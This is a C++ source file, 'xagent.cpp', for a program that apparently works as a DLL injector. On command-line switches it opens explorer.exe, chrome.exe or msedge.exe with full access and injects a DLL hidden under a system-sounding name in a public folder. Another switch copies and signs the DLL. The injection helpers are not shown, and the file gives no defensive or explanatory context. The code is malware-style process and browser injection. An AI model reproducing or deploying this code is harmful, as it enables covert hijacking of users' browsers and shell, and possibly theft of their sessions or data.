// xagent.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
#include "ProcessUtil.h"
#include "HookUtil.h"
#include "MyDefine.h"

int main(int argc, char* argv[])
{

	MyWriteLog("XAgent ... Main Start");

	if (argc < 2) {
		return 0;
	}
	wchar_t wszPath[MAX_PATH]; memset(wszPath, 0, sizeof(wszPath));
	swprintf_s(wszPath, MAX_PATH, L"C:\\Users\\Public\\data\\ntdb.dll");

	if (_stricmp(argv[1], "--install") == 0) {

		MyWriteLog("XAgent ... Main install");


		DWORD explorerPID = GetExplorerPID("");
		MyWriteLog("XAgent ... Main explorerPID = %d" , explorerPID);

		if (explorerPID == 0) {
		}
		else {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
			MyWriteLog("XAgent ... Main hProcess = %d", hProcess);
			if (hProcess) {
				MyWriteLog("XAgent ... Main InjectDll_SVC");
				InjectDll_SVC(hProcess, wszPath);
			}
		}
	}
	else if (_stricmp(argv[1], "--uploaddll") == 0) {

		MyWriteLog("XAgent ... Main uploaddll");

		ModContentToFile(GD_TEMP_DLL_FILEPATH, GD_LOCAL_DLL_FILEPATH);
		cmd_sign(GD_LOCAL_DLL_FILEPATH, GD_LOCAL_SIGNTOOL_FILEPATH);
	}
	else if (_stricmp(argv[1], "--browser_chrome") == 0) {

		MyWriteLog("XAgent ... Main browser_chrome");
		DWORD w_browserPID = GetExplorerPID("chrome.exe");
		MyWriteLog("XAgent ... Main w_browserPID = %d", w_browserPID);

		if (w_browserPID == 0) {
		}
		else {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, w_browserPID);
			MyWriteLog("XAgent ... Main browser_chrome hProcess = %d", hProcess);
			if (hProcess) {
				MyWriteLog("XAgent ... Main browser_chrome InjectDll_SVC");
				InjectDll_SVC(hProcess, wszPath);
			}
		}
	}
	else if (_stricmp(argv[1], "--browser_msedge") == 0) {

		MyWriteLog("XAgent ... Main browser_msedge");
		DWORD w_browserPID = GetExplorerPID("msedge.exe");
		MyWriteLog("XAgent ... Main w_browserPID = %d", w_browserPID);

		if (w_browserPID == 0) {
		}
		else {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, w_browserPID);
			MyWriteLog("XAgent ... Main browser_msedge hProcess = %d", hProcess);
			if (hProcess) {
				MyWriteLog("XAgent ... Main browser_msedge InjectDll_SVC");
				InjectDll_SVC(hProcess, wszPath);
			}
		}
	}
	else if (_stricmp(argv[1], "--uninject") == 0) {
		//std::wstring processName = L"chrome.exe";
		//TeminateProcess(processName);
		//processName = L"msedge.exe";
		//TeminateProcess(processName);

		//UninjectDLL(GetExplorerPID(), "ntdb.dll");
	}
	else if(_stricmp(argv[1], "--uninstall") == 0) {
	}
	else {
		MyWriteLog("XAgent ... Main End");
		return 0;
	}

	MyWriteLog("XAgent ... Main End");
	return 0;
}


